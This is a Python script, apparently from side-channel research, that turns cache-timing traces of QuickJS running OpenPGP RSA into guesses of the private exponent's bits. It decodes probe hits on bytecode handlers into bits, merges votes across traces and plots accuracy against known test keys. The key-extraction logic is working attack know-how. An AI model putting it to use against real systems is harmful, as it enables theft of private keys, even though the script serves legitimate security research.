import argparse
import glob
import json
import math
import os
import random
import re

from concurrent.futures import ProcessPoolExecutor, as_completed
from pathlib import Path
import numpy as np
import pandas as pd
from bokeh.layouts import column
from bokeh.models import HoverTool, LinearAxis, Range1d
from bokeh.palettes import Colorblind
from bokeh.plotting import figure, show
from scipy.signal import stft
from multiprocessing import Manager

from utils import *

manager = Manager()

skey = None
use_cache = True
trace_number = 0
plot_dist = False
attack_type = "FR"

interval_min = 1
sample_interval = 1
fs = 1


class RSA_KEY:

    def __init__(self, key_str, kid=None):
        self.kid = kid
        self.infer_keys = manager.list()
        if key_str.startswith("0x"):
            self.secret_key = int(key_str, 16)
        else:
            self.secret_key = int("0x" + key_str, 16)
        self.secret_key_bin = bin(self.secret_key)[2:]
        self.secret_key_bits = len(self.secret_key_bin)
        self.bit_counter = [{"0": 0, "1": 0} for i in range(self.secret_key_bits)]

    def merge_inference(self, count=None, shuffle=False):
        if len(self.infer_keys) == 0:
            return
        if shuffle:
            random.shuffle(self.infer_keys)

        self.bit_counter = [{"0": 0, "1": 0} for i in range(self.secret_key_bits)]
        for cnt, infer_key in enumerate(self.infer_keys):
            for i, bit in enumerate(infer_key):
                self.bit_counter[i][bit] += 1
            if count and cnt == count:
                break
        return

    def check_per_inference_acc(self):
        t, f = 0, 0
        acc = []
        for key in self.infer_keys:
            for i in range(self.secret_key_bits):
                if key[i] == self.secret_key_bin[i]:
                    t += 1
                else:
                    f += 1
            acc.append(t / (t + f))
        return acc

    def check_accuracy(self, thres=(0.90, 0.90)):
        self.merge_inference()
        t, f = 0, 0
        count = self.bit_counter[0]["1"] + self.bit_counter[0]["0"]
        if count == 0:
            return None
        for i in range(self.secret_key_bits):
            ppr = self.bit_counter[i]["1"] / count
            if ppr >= thres[1]:
                if self.secret_key_bin[i] == "1":
                    t += 1
                else:
                    f += 1
            elif ppr <= thres[0]:
                if self.secret_key_bin[i] == "0":
                    t += 1
                else:
                    f += 1
            else:
                f += 1

        return t / (t + f)

    def single_run_inference(self, data_samples, expected_sar_interval, ts0=0):
        tsc_start = np.min(data_samples["tsc"])
        tsc_end = np.max(data_samples["tsc"])
        rounds = (tsc_end - tsc_start) / expected_sar_interval
        if (
            0.80 * self.secret_key_bits <= rounds
            and rounds <= self.secret_key_bits * 1.20
        ):
            print(f"Find a execution sequence of {rounds}")
        else:
            # if rounds:
            #     print(f"Skip a group of {rounds}")
            return ""

        sar_samples = data_samples[
            data_samples.apply(lambda s: s["bytecode"] == "sar", axis=1)
        ]
        sar_interval = sar_samples["tsc"].diff()
        sar_interval = sar_interval[sar_interval.notnull()]
        sar_median = sar_interval.median()

        mul_samples = data_samples[
            data_samples.apply(lambda s: s["bytecode"] == "mul", axis=1)
        ]

        mod_samples = data_samples[
            data_samples.apply(lambda s: s["bytecode"] == "mod", axis=1)
        ]

        goto8_samples = data_samples[
            data_samples.apply(lambda s: s["bytecode"] == "goto8", axis=1)
        ]

        data_samples = data_samples.sort_values(["tsc"], ascending=[False]).reset_index(
            drop=True
        )

        post_boundary = post_processing_boundary(goto8_samples["tsc"])

        last_hit = np.max(data_samples["tsc"])
        data_sample_tuples = list(data_samples.itertuples(index=False))
        encrypt_end = tsc_end
        for s in data_sample_tuples:
            tsc, hit, bytecode = s
            if tsc > post_boundary:
                last_hit = tsc
                continue
            interval = last_hit - tsc
            if interval < sar_median / 5:
                encrypt_end = tsc
                last_hit = tsc
            else:
                break

        last_hit, goto = np.max(data_samples["tsc"]), []
        key = ""
        goto_hit_range = (1 / 4, 3 / 4)
        first_sar = False
        for s in data_sample_tuples:
            tsc, hit, bytecode = s
            if tsc > encrypt_end:
                last_hit = tsc
                continue
            if bytecode == "sar":
                interval = last_hit - tsc
                ratio = interval / sar_median
                if not first_sar:
                    if tsc < encrypt_end - sar_median / 2:
                        # False SAR hit
                        # print("first sar", tsc, len(goto))
                        bit_val = 0
                        for g in goto:
                            if (
                                g > tsc + interval * goto_hit_range[0]
                                and g < tsc + interval * goto_hit_range[1]
                            ):
                                bit_val = 1
                                break
                        if bit_val:
                            first_sar = True
                            key += "1"
                            last_hit = tsc
                            goto = []
                elif ratio <= 0.30:
                    # consecutive probes
                    pass
                elif 0.30 <= ratio and ratio < 0.70:
                    # FIXME: weird interval
                    # print(f"Maybe noise at {tsc-tsc_start}: interval ratio {ratio}")
                    pass
                elif 0.70 <= ratio and ratio < 1.20:
                    global interval_min
                    interval_min = min(interval_min, ratio)
                    bit_val = 0
                    for g in goto:
                        if (
                            g > tsc + interval * goto_hit_range[0]
                            and g < tsc + interval * goto_hit_range[1]
                        ):
                            bit_val = 1
                            break
                    if len(key) == 0:
                        bit_val = 1
                    key = key + str(bit_val)
                    last_hit = tsc
                    goto = []
                else:
                    # pretend missing one sar hit
                    slots = interval / sar_median
                    frac = slots % 1
                    # print(interval / sar_median, slots)
                    # FIXME: better rules for .4 interval (probably due to HW interrupts?)
                    if frac > 0.20 and frac < 0.80:
                        # print(f"weird interval ratio {ratio}")
                        slots = math.floor(slots)
                    else:
                        slots = round(slots)
                    middle_interval = interval / slots
                    ttsc = last_hit - middle_interval
                    for s in range(slots):
                        bit_val = 0
                        for g in goto:
                            if (
                                g > ttsc + interval * goto_hit_range[0]
                                and g < ttsc + interval * goto_hit_range[1]
                            ):
                                bit_val = 1
                                break
                        if len(key) == 0:
                            bit_val = 1
                        key = key + str(bit_val)
                        ttsc -= middle_interval
                    last_hit = tsc
                    goto = []
            elif bytecode == "goto8":
                goto.append(tsc)
            # FIXME: better rules for lowest bit
            if len(key) == self.secret_key_bits - 1:
                break
        key += "1"
        return key

    def infer_trace(self, trace):
        keys = []
        if len(trace) == 0:
            return keys
        var_map = {0: "goto8", 1: "sar", 2: "mul", 3: "mod"}
        data_samples = {"tsc": [], "hit": [], "bytecode": []}
        for row in trace.melt().itertuples():
            idx, var, val = row
            tsc, lat = val
            data_samples["tsc"].append(tsc)
            data_samples["hit"].append(lat_to_hit(lat, attack_type))
            data_samples["bytecode"].append(var_map[var])

        data_samples = pd.DataFrame(data_samples)
        data_samples = data_samples[data_samples.apply(lambda s: s["hit"], axis=1)]

        data_samples = data_samples.sort_values(
            ["tsc", "bytecode"], ascending=[True, False]
        ).reset_index(drop=True)

        sar_samples = data_samples[
            data_samples.apply(lambda s: s["bytecode"] == "sar", axis=1)
        ]
        sar_interval = sar_samples["tsc"].diff()
        sar_interval = sar_interval[sar_interval.notnull()]
        sar_median = sar_interval.median()

        tsc0 = 0
        idx0 = 0
        for s in data_samples.itertuples():
            idx, tsc, hit, bytecode = s
            if tsc - tsc0 > 5 * sar_median:
                one_run_data_samples = data_samples[idx0:idx]
                infer_key = self.single_run_inference(one_run_data_samples, sar_median)
                keys.append(infer_key)
                idx0 = idx
            tsc0 = tsc

        one_run_data_samples = data_samples[idx0:]
        infer_key = self.single_run_inference(one_run_data_samples, sar_median)
        keys.append(infer_key)
        return keys

    def infer_file(self, filename):
        infer_cache_fp = filename.replace(".out", ".inf")
        cached = False
        if use_cache and os.path.exists(infer_cache_fp):
            cache = open(infer_cache_fp, "r")
            keys = cache.readlines()

            if len(keys) == 1:
                if len(keys[0]) == self.secret_key_bits:
                    self.infer_keys.append(keys[0])
            cached = True
        if not cached:
            lines = load_trace(filename)
            keys = self.infer_trace(lines)
            for key in keys:
                if len(key) == self.secret_key_bits:
                    cache = open(infer_cache_fp, "w")
                    cache.writelines(keys)
                    self.infer_keys.append(key)
                    break
            else:
                cache = open(infer_cache_fp, "w")
                cache.writelines(["NA"])
        return

    def infer_directory(self, output_dir):
        executor = ProcessPoolExecutor()
        futures = []
        files = glob.glob(str(output_dir) + "/*.out")
        random.shuffle(files)

        task_file = progress.add_task("[green]Processing traces...", total=len(files))
        for idx, fp in enumerate(files):
            future = executor.submit(self.infer_file, fp)
            futures.append(future)

        for future in as_completed(futures, timeout=20):
            progress.update(task_file, advance=1)
            future.result(timeout=2)

        progress.remove_task(task_file)
        return

    def load_key(kid):
        rsa_key_path = f"{find_project_root()}/experiments/quickjs_rsa/rsa_key_pool/rsa_key_{kid}.json"
        rsa_key = json.load(open(rsa_key_path))
        return RSA_KEY(rsa_key["d"], kid)


def post_processing_boundary(data_samples):
    probe_ts = data_samples.apply(
        lambda x: round(x / sample_interval) * sample_interval
    )
    tsc0 = min(probe_ts)
    probe_ts -= tsc0

    length = (max(probe_ts) - min(probe_ts)) // sample_interval
    signals = [0 for i in range(length + 1)]

    for ts in probe_ts:
        signals[ts // sample_interval] = 1

    frequencies, times, Zxx = stft(signals, fs, nperseg=128)
    target_freq = 9333
    index_2khz = np.argmin(np.abs(frequencies - target_freq))

    magnitude = np.abs(Zxx)

    magnitude_2khz = magnitude[:index_2khz]
    normalized_magnitude = (magnitude_2khz - magnitude_2khz.min()) / (
        magnitude_2khz.max() - magnitude_2khz.min()
    )
    energy = np.sum(normalized_magnitude**2, axis=0)
    boundary_index = np.where(energy > 0.5)
    # print(boundary_index)
    # print(len(times))
    # print(times[boundary_index[0][-1]], times[boundary_index[0][-1] + 1])
    # print(
    #     f"{times[boundary_index[0][-1]] * fs * sample_interval + tsc0:.0f}, {times[boundary_index[0][-1] + 1] * fs * sample_interval + tsc0:.0f}"
    # )
    if len(boundary_index[0]) > 1 and boundary_index[0][-1] > 5:
        return times[boundary_index[0][-1]] * fs * sample_interval + tsc0
    return max(data_samples)


def check_optimal_TP_ratio(skey: RSA_KEY, infer_keys, bit_counter):
    optimal_thres, optimal_err = 0, skey.secret_key_bits
    for thres in range(len(infer_keys)):
        infer_key = ""
        for i in range(skey.secret_key_bits):
            if bit_counter[i]["1"] > thres:
                infer_key += "1"
            else:
                infer_key += "0"
        err_bit_cnt = (int(infer_key, 2) ^ (skey.secret_key)).bit_count()
        if err_bit_cnt < optimal_err:
            optimal_err = err_bit_cnt
            optimal_thres = thres
    print(f"Use optimal threshold: {optimal_thres} {optimal_thres/len(infer_keys)}")
    return optimal_thres


def plot_bits_distribution(bit_count, max_FP, min_TP):
    p = figure(
        width=1200,
        height=600,
        title=f"Bits Distribution",
        x_axis_label="Positive Rate",
        y_axis_label="Distribution",
        background_fill_color="#fafafa",
    )
    tot = bit_count[0]["0"] + bit_count[0]["1"]
    bit_pr = list(map(lambda bc: bc["1"] / tot, bit_count))
    hist, edges = np.histogram(bit_pr, bins=200)
    cdf = np.cumsum(hist) / sum(hist)
    hist_line = p.quad(
        top=hist,
        bottom=0,
        left=edges[:-1],
        right=edges[1:],
        fill_color="navy",
        line_color="white",
        alpha=0.9,
        legend_label="hist",
    )

    p.y_range.start = 0
    p.legend.click_policy = "hide"
    p.grid.grid_line_color = "white"
    p.ygrid.band_fill_color = "#f0f0f0"
    p.ygrid.band_fill_alpha = 0.2
    hover = HoverTool(
        renderers=[hist_line],
        tooltips=[
            (
                "Positive Rate",
                "@left{0.000} - @right{0.000}",
            ),  # this will show integer, even if x is float
            ("Count", "@top"),  # this will format as 1-decimal float
        ],
    )
    p.add_tools(hover)

    p.extra_y_ranges = {"cdf": Range1d(start=0, end=1)}
    cdf_axis = LinearAxis(y_range_name="cdf", axis_label="CDF")
    cdf_axis.ticker = list(np.linspace(0, 1, 11))
    p.add_layout(cdf_axis, "right")
    cdf_line = p.line(
        x=edges[1:],
        y=cdf,
        line_width=2,
        color="orange",
        alpha=0.7,
        legend_label="CDF",
        y_range_name="cdf",
    )
    p.segment(
        x0=[0],
        y0=[0.5],
        x1=[1],
        y1=[0.5],
        line_width=2,
        alpha=0.3,
        y_range_name="cdf",
        legend_label="0.5",
    )
    p.segment(
        x0=[max_FP],
        y0=[0],
        x1=[max_FP],
        y1=[1],
        line_width=2,
        alpha=0.5,
        color="red",
        y_range_name="cdf",
        legend_label="Max N",
    )
    p.segment(
        x0=[min_TP],
        y0=[0],
        x1=[min_TP],
        y1=[1],
        line_width=2,
        alpha=0.5,
        color="green",
        y_range_name="cdf",
        legend_label="Min P",
    )

    p.title.text_font_size = "16pt"
    p.legend.label_text_font_size = "12pt"
    p.legend.glyph_height = 40
    p.legend.glyph_width = 40
    p.xaxis.axis_label_text_font_size = "16pt"
    p.xaxis.major_label_text_font_size = "16pt"
    p.yaxis.axis_label_text_font_size = "16pt"
    p.yaxis.major_label_text_font_size = "16pt"
    p.legend.click_policy = "hide"
    p.add_layout(p.legend[0], "right")
    hover_cdf = HoverTool(
        renderers=[cdf_line],
        tooltips=[
            ("X value", "@x{0.000}"),  # Show the bin edge (X value)
            ("CDF", "@y{0.000}"),  # Show the CDF value
        ],
    )
    p.add_tools(hover_cdf)
    return p


def plot_acc_with_observations(infer_keys):
    p = figure(
        width=1200,
        height=600,
        title=f"Accurarcy with Observations",
        x_axis_label="#Observation",
        y_axis_label="Accuracy",
    )

    bit_counter = [{"0": 0, "1": 0} for i in range(skey.secret_key_bits)]

    max_FP_rate, min_TP_rate = [], []
    percent_99_FP, percent_01_TP = [], []
    acc_95_90, acc_98_95, acc_97_96 = [], [], []
    for n_obs, infer_key in enumerate(infer_keys):
        for i, bit in enumerate(infer_key):
            bit_counter[i][bit] += 1
        F_P_rate, T_P_rate = [], []
        tp_tn_95_90, tp_tn_98_95, tp_tn_97_96 = 0, 0, 0
        for i in range(skey.secret_key_bits):
            p_rate = bit_counter[i]["1"] / (n_obs + 1)
            if skey.secret_key_bin[i] == "1":
                T_P_rate.append(p_rate)
                if p_rate > 0.95:
                    tp_tn_95_90 += 1
                if p_rate > 0.98:
                    tp_tn_98_95 += 1
                if p_rate > 0.97:
                    tp_tn_97_96 += 1
            else:
                F_P_rate.append(p_rate)
                if p_rate < 0.90:
                    tp_tn_95_90 += 1
                if p_rate < 0.95:
                    tp_tn_98_95 += 1
                if p_rate < 0.96:
                    tp_tn_97_96 += 1

        min_TP_rate.append(np.min(T_P_rate))
        max_FP_rate.append(np.max(F_P_rate))
        percent_99_FP.append(np.percentile(F_P_rate, 99))
        percent_01_TP.append(np.percentile(T_P_rate, 1))
        acc_95_90.append(tp_tn_95_90 / skey.secret_key_bits)
        acc_98_95.append(tp_tn_98_95 / skey.secret_key_bits)
        acc_97_96.append(tp_tn_97_96 / skey.secret_key_bits)

    px = list(range(len(infer_keys)))
    palette = Colorblind[7]
    p.line(px, min_TP_rate, legend_label="min 1 P_rate", color=palette[0], line_width=3)
    p.line(px, max_FP_rate, legend_label="max 0 P_rate", color=palette[1], line_width=3)
    p.line(
        px, percent_01_TP, legend_label="01% 1 P_rate", color=palette[2], line_width=3
    )
    p.line(
        px, percent_99_FP, legend_label="99% 0 P_rate", color=palette[3], line_width=3
    )
    p.line(px, acc_98_95, legend_label="[N95, T98]", color=palette[4], line_width=3)
    p.line(px, acc_95_90, legend_label="[N90, T95]", color=palette[5], line_width=3)
    p.line(px, acc_97_96, legend_label="[N96, T97]", color=palette[6], line_width=3)

    hover = HoverTool(
        tooltips=[("#Observations", "@x{int}"), ("Accuracy", "@y{0.000}")]
    )
    p.add_tools(hover)

    p.title.text_font_size = "16pt"
    p.legend.label_text_font_size = "12pt"
    p.legend.glyph_height = 40
    p.legend.glyph_width = 40
    p.xaxis.axis_label_text_font_size = "16pt"
    p.xaxis.major_label_text_font_size = "16pt"
    p.yaxis.axis_label_text_font_size = "16pt"
    p.yaxis.major_label_text_font_size = "16pt"
    p.legend.click_policy = "hide"
    p.add_layout(p.legend[0], "right")

    return p


def infer_all_in_one(skey, output_file):
    skey.infer_file(output_file)
    print(f"Key: {skey.kid:03d}, Acc: {skey.check_accuracy()}")


def infer_directory(skey, output_dir):
    if not Path(output_dir).exists() or not Path(output_dir).is_dir():
        raise ValueError(f"Invalid directory path {output_dir}")
    skey.infer_directory(output_dir)
    print(f"Key: {skey.kid:03d}, Acc: {skey.check_accuracy()}")


def infer_key_pool(output_dir):
    pattern = r"quickjs_openpgp_rsa_key_pool_key(\d+)+"
    task_keys = progress.add_task(
        "[blue]Resolving keys...", total=len(os.listdir(output_dir))
    )
    print(output_dir)
    for key_out_dir in os.listdir(output_dir):
        matches = re.search(pattern, key_out_dir)
        if matches:
            kid = int(matches.group(1))
            skey = RSA_KEY.load_key(kid)
            progress.update(task_keys, description=f"[blue]Resolving key {kid}")
            skey.infer_directory(output_dir + "/" + key_out_dir)
            print(f"Key: {skey.kid:03d}, Acc: {skey.check_accuracy()}")
        progress.update(task_keys, advance=1, refresh=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Extract secret key from on quickjs openpgp rsa trace"
    )
    parser.add_argument(
        "--no-cache",
        action="store_true",
        help="load the inference result from cache",
    )

    parser.add_argument(
        "--at",
        choices=["FR", "PS", "PP"],
        default="FR",
        help="Attack Primitive: FR or PS (default: FR)",
    )

    parser.add_argument(
        "-n",
        "--number",
        type=int,
        help="Number of traces to merge",
    )

    group = parser.add_mutually_exclusive_group(required=True)

    group.add_argument(
        "-d",
        "--directory",
        type=str,
        help="Output directory",
    )

    group.add_argument(
        "-f",
        "--file",
        type=str,
        help="Output file",
    )

    group.add_argument(
        "-p",
        "--keypool",
        type=str,
        help="Key Pool directory",
    )

    parser.add_argument(
        "--plot",
        action="store_true",
        help="Plot bit positive rate distribution",
    )

    parser.add_argument(
        "--id",
        type=int,
        help="RSA key ID",
    )

    args = parser.parse_args()
    if args.no_cache:
        use_cache = False

    if args.number:
        trace_number = args.number

    if args.plot:
        plot_dist = True

    if args.at == "PS":
        sample_interval = PS_sample_interval
        fs = PS_fs

    kid = 0
    if args.id != None:
        kid = int(args.id)
    skey = RSA_KEY.load_key(kid)
    print(skey.secret_key_bits)

    attack_type = args.at

    if args.file:
        infer_all_in_one(skey, args.file)
    elif args.directory:
        infer_directory(skey, args.directory)
    elif args.keypool:
        with progress:
            infer_key_pool(args.keypool)
